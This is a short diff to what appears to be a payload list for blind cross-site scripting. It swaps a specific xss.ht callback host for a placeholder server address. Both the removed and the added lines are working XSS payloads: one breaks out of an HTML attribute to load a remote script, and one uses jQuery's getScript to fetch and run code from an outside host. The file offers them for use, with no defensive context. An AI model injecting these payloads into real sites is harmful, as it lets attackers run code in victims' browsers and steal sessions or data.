@@ -1,4 +1,6 @@
-"><script src=https://emptymahbob.xss.ht></script>
+//Blind XSS payload
 
-<script>$.getScript("//emptymahbob.xss.ht")</script>
+"><script src=https://your_server_address></script>
+
+<script>$.getScript("//your_server_address")</script>
 
